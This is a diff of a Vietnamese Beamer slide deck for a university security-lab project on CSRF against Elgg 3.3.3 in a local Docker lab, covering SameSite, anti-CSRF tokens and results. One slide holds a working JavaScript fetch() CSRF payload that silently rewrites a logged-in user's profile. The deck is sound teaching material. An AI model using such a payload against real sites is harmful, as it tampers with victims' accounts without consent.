@@ -4,7 +4,7 @@
 % =====================================================================
 \documentclass[11pt,aspectratio=169]{beamer}
 \usetheme{metropolis}
-\metroset{progressbar=frametitle,numbering=fraction,block=fill}
+\metroset{progressbar=frametitle,numbering=fraction,block=fill,sectionpage=none}
 
 \usepackage{fontspec}
 \setsansfont{TeX Gyre Heros}
@@ -35,6 +35,7 @@
 \usepackage{tikz}
 \usetikzlibrary{arrows.meta,positioning,calc}
 \usepackage{booktabs}
+\usepackage{graphicx}
 \usepackage{listings}
 \definecolor{codebg}{HTML}{0F172A}\definecolor{codefg}{HTML}{E2E8F0}
 \definecolor{codekey}{HTML}{38BDF8}\definecolor{codestr}{HTML}{86EFAC}
@@ -58,8 +59,8 @@
 % ---- Title metadata ----
 \title{Tấn công CSRF trên Elgg bằng Fetch API}
 \subtitle{Thay thế XMLHttpRequest / Form submit bằng \texttt{fetch()} hiện đại}
-\author{Nhóm 3 — \textit{TV1 · TV2 · TV3}}
-\institute{An toàn và Bảo mật Hệ thống Thông tin}
+\author{Nhóm 6 — Thành (23001935) · Trí (23001939) · Thao (23001936)}
+\institute{An toàn máy tính — Trường ĐH Khoa học Tự nhiên, ĐHQGHN}
 \date{\today}
 
 \begin{document}
@@ -71,35 +72,28 @@
 \begin{frame}[plain]\titlepage\end{frame}}
 
 % ---------------------------------------------------------------
-\begin{frame}{Nội dung trình bày}
-  \setbeamertemplate{section in toc}[sections numbered]
-  \tableofcontents
-\end{frame}
-
-% ===============================================================
-\section{Phân công \& Tổng quan}
-
-\begin{frame}{Phân công công việc (Nhóm 3 — mô hình 2 tầng)}
-  \textbf{Tầng 1 — Nền tảng chung (bắt buộc 100\% thành viên):} tự chạy Docker, tự bắt gói tin, tự đổi About me thành MSV của mình, cùng vấn đáp chéo 15 câu hỏi.
-  \vfill
+\begin{frame}{Nội dung trình bày \& phân công}
   \begin{columns}[t]
-    \column{0.33\textwidth}
-      \begin{block}{TV1 — Offensive}
-        \scriptsize Docker, bắt gói tin, \texttt{index.html} + \texttt{exploit.py}. \\ Q\&A 4–8.
-      \end{block}
-    \column{0.33\textwidth}
-      \begin{block}{TV2 — Browser/Defense}
-        \scriptsize Phân tích trình duyệt/CORS/SameSite, quay \& dựng video. \\ Q\&A 1,3,10–14.
-      \end{block}
-    \column{0.33\textwidth}
-      \begin{block}{TV3 — Research/Slides}
-        \scriptsize Slide, sơ đồ, báo cáo, kiểm chứng phòng thủ. \\ Q\&A 2,9,15.
-      \end{block}
+    \column{0.52\textwidth}
+      \setbeamertemplate{section in toc}[sections numbered]
+      \tableofcontents
+    \column{0.46\textwidth}
+      \footnotesize
+      \textbf{Phân công (Nhóm 6):}
+      \begin{itemize}\footnotesize
+        \item \textbf{Thành} — lý thuyết, HTTP, phòng chống
+        \item \textbf{Trí} — Elgg, Docker, Fetch API, kiểm thử
+        \item \textbf{Thao} — bằng chứng, slide, video
+      \end{itemize}
+      \scriptsize\color{slate} 100\% thành viên tự chạy Docker, tự bắt gói tin, tự đổi About me theo MSV, cùng vấn đáp 15 câu hỏi.
   \end{columns}
 \end{frame}
 
+% ===============================================================
+\section{Tổng quan \& Lý thuyết}
+
 \begin{frame}{CSRF là gì?}
-  \alert{Cross-Site Request Forgery} — kẻ tấn công lừa trình duyệt của nạn nhân (\emph{đang đăng nhập}) gửi một yêu cầu mạo danh tới máy chủ mục tiêu.
+  \alert{Cross-Site Request Forgery} — kẻ tấn công lừa trình duyệt của nạn nhân (\emph{đang đăng nhập}) gửi một yêu cầu mạo danh tới máy chủ mục tiêu. Không cần mật khẩu, không trộm cookie — chỉ \emph{mượn} phiên.
   \vfill
   \textbf{Ba điều kiện cần:}
   \begin{enumerate}
@@ -108,7 +102,45 @@
     \item Ứng dụng \alert{thiếu phòng vệ} (không SameSite, không token).
   \end{enumerate}
   \vfill
-  \footnotesize\textbf{Mục tiêu:} đổi trường \emph{About me} của Alice thành \texttt{CSRF attack by <MSV>}.
+  \footnotesize\textbf{Mục tiêu:} đổi trường \emph{About me} của Alice thành \texttt{CSRF attack by 23001939}.
+\end{frame}
+
+\begin{frame}{Same-site vs cross-site \& khe hở cốt lõi}
+  \footnotesize
+  \begin{tabular}{lll}
+    \toprule
+    \textbf{Khái niệm} & \textbf{Định nghĩa} & \textbf{Ví dụ trong lab}\\
+    \midrule
+    Same-origin & scheme+host+port & elgg\ldots:8080 với chính nó\\
+    Same-site & cùng site (eTLD+1) & attacker.csrf.localhost \& elgg.csrf.localhost\\
+    Cross-site & khác site & 127.0.0.1 với elgg.csrf.localhost\\
+    \bottomrule
+  \end{tabular}
+  \vfill
+  \begin{alertblock}{Khe hở ``gửi được nhưng không đọc được''}
+    \footnotesize SOP cấm JS \emph{đọc} response khác origin, nhưng \textbf{không} cấm \emph{gửi} request. CSRF chỉ cần hành động được thực thi — không cần đọc kết quả. Vì vậy \texttt{mode:'no-cors'} (opaque) vẫn đủ.
+  \end{alertblock}
+\end{frame}
+
+\begin{frame}{Hai mô hình môi trường thực nghiệm}
+  \footnotesize
+  \begin{columns}[t]
+    \column{0.46\textwidth}
+      \begin{block}{Mô hình SEED chuẩn (khái niệm)}
+        \scriptsize www.seed-server.com + www.attacker32.com — khung lý thuyết tham chiếu.
+      \end{block}
+    \column{0.52\textwidth}
+      \begin{exampleblock}{Lab Docker thật của nhóm (đã chạy)}
+        \scriptsize Elgg \textbf{3.3.3} @ elgg.csrf.localhost:8080\\
+        Attacker cùng-site @ attacker.csrf.localhost:8000\\
+        Attacker khác-site @ 127.0.0.1:8000\\
+        Hai chế độ: \texttt{protected} / \texttt{vulnerable}
+      \end{exampleblock}
+  \end{columns}
+  \vfill
+  \begin{block}{Vì sao hai host attacker?}
+    \scriptsize Đổi \alert{đúng một biến} (cùng-site $\leftrightarrow$ khác-site) để tách bạch vai trò của cookie \texttt{SameSite} với anti-CSRF token.
+  \end{block}
 \end{frame}
 
 % ===============================================================
@@ -130,31 +162,30 @@
   \begin{alertblock}{Hai cờ then chốt}
     \footnotesize
     \texttt{credentials: 'include'} → ép trình duyệt đính kèm cookie phiên cross-origin.\\
-    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{không} Preflight.
+    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{không} Preflight OPTIONS.
   \end{alertblock}
 \end{frame}
 
 \begin{frame}[fragile]{Phân tích gói tin \& mã khai thác}
-  \scriptsize Endpoint: \texttt{POST http://www.seed-server.com/action/profile/edit}
+  \scriptsize Endpoint (lab thật): \texttt{POST http://elgg.csrf.localhost:8080/action/profile/edit}
   \begin{lstlisting}[language=JS]
 const payload = new URLSearchParams();
 payload.append('name', 'Alice');
-payload.append('description', '<p>CSRF attack by B21DCCN001</p>');
+payload.append('description', 'CSRF attack by 23001939');
 payload.append('accesslevel[description]', '2');   // 2 = Public
-payload.append('guid', '42');                       // Alice's GUID
-fetch('http://www.seed-server.com/action/profile/edit', {
+payload.append('guid', '56');                       // Alice's GUID
+fetch('http://elgg.csrf.localhost:8080/action/profile/edit', {
   method: 'POST',
   mode: 'no-cors',          // Simple Request -> no Preflight
   credentials: 'include',   // REQUIRED: attach session cookie
-  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  body: payload
+  body: payload             // URLSearchParams tu sinh Content-Type
 });
   \end{lstlisting}
   \footnotesize Biến thể \texttt{FormData}: không đặt \texttt{Content-Type} thủ công (trình duyệt tự sinh boundary).
 \end{frame}
 
 % ===============================================================
-\section{Luồng tấn công \& Kết quả}
+\section{Kết quả \& Phòng thủ}
 
 \begin{frame}{Sơ đồ luồng tấn công}
   \begin{center}
@@ -162,26 +193,46 @@ fetch('http://www.seed-server.com/action/profile/edit', {
   \end{center}
 \end{frame}
 
-\begin{frame}{Minh chứng thực nghiệm}
-  \begin{columns}[t]
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Trước}\\[3pt]About me ban đầu}}
-      \\[4pt]\scriptsize Hồ sơ gốc của Alice
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Trong}\\[3pt]Console F12: Fetch POST}}
-      \\[4pt]\scriptsize Gửi ngầm, không chuyển trang
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Sau}\\[3pt]\texttt{CSRF attack by <MSV>}}}
-      \\[4pt]\scriptsize About me đã bị đổi
+\begin{frame}{Minh chứng thực nghiệm (ảnh thật, Elgg 3.3.3)}
+  \begin{columns}[c]
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-before.jpg}
+      \\[2pt]\scriptsize\textbf{Trước:} About me baseline
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-protected-blocked.jpg}
+      \\[2pt]\scriptsize\textbf{Protected:} \alert{``missing \_\_token''}
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-after-success.jpg}
+      \\[2pt]\scriptsize\textbf{Sau (vulnerable):} đã bị đổi
   \end{columns}
   \vfill
-  \begin{exampleblock}{Kết quả}
-    \small Tấn công thành công hoàn toàn — không cảnh báo, không chuyển hướng (môi trường chưa bật phòng vệ).
+  \begin{exampleblock}{Ma trận kết quả}
+    \scriptsize
+    \begin{tabular}{llcc}
+      protected · cùng-site & token bật & \textbf{chặn} & \no{} đổi\\
+      vulnerable · khác-site & SameSite & \textbf{chặn} & \no{} đổi\\
+      vulnerable · cùng-site & token tắt & \textbf{thành công} & \yes{} đổi\\
+    \end{tabular}
   \end{exampleblock}
 \end{frame}
 
-% ===============================================================
-\section{Phòng thủ \& Kết luận}
+\begin{frame}{Hai lớp phòng thủ — chứng minh độc lập}
+  \footnotesize
+  \begin{columns}[t]
+    \column{0.5\textwidth}
+      \begin{block}{Anti-CSRF token (server)}
+        \scriptsize Attacker không đọc được token (SOP) $\Rightarrow$ request giả thiếu token $\Rightarrow$ Elgg từ chối: \alert{``Form is missing \_\_token''}.
+      \end{block}
+    \column{0.5\textwidth}
+      \begin{block}{Cookie SameSite (trình duyệt)}
+        \scriptsize Ngay cả khi token tắt, POST \emph{khác-site} không mang cookie phiên $\Rightarrow$ Elgg coi là khách lạ $\Rightarrow$ hồ sơ không đổi.
+      \end{block}
+  \end{columns}
+  \vfill
+  \begin{alertblock}{Phát hiện kỹ thuật}
+    \scriptsize About me lưu ở \emph{annotation} \texttt{profile:description}, không phải metadata \texttt{\$user->description} $\Rightarrow$ tool \texttt{reset-profile} ban đầu reset sai bảng. Bài học: chỉ tin bằng chứng đối chiếu trực tiếp.
+  \end{alertblock}
+\end{frame}
 
 \begin{frame}{Phòng thủ nhiều lớp (Defense-in-Depth)}
   \footnotesize
@@ -197,8 +248,8 @@ fetch('http://www.seed-server.com/action/profile/edit', {
     \bottomrule
   \end{tabular}
   \medskip
-  \begin{block}{Bằng chứng phòng thủ}
-    \footnotesize Bật lại anti-CSRF token của Elgg → cùng payload \alert{thất bại} (thiếu \texttt{\_\_elgg\_token}). About me \textbf{không đổi}.
+  \begin{block}{Khuyến nghị}
+    \footnotesize \texttt{SameSite=Lax} + anti-CSRF token + kiểm tra \texttt{Origin} cho endpoint nhạy cảm. Không dùng \texttt{GET} cho hành động đổi trạng thái.
   \end{block}
 \end{frame}
 
@@ -207,7 +258,7 @@ fetch('http://www.seed-server.com/action/profile/edit', {
   \begin{itemize}\small
     \item \textbf{Mức 1:} phản biện cơ chế CORS/Simple Request — sinh viên tự code.
     \item \textbf{Mức 2:} AI đồng sáng tạo định dạng, sơ đồ theo thiết kế của nhóm.
-    \item \textbf{Mức 3:} AI sinh khung \texttt{exploit.py}/template; nhóm cấu hình \& kiểm thử.
+    \item \textbf{Mức 3:} AI hỗ trợ sinh khung công cụ \& automation kiểm thử; nhóm cấu hình, chạy và chịu trách nhiệm kết quả.
   \end{itemize}
   \vfill
   \begin{alertblock}{Thông điệp cốt lõi}
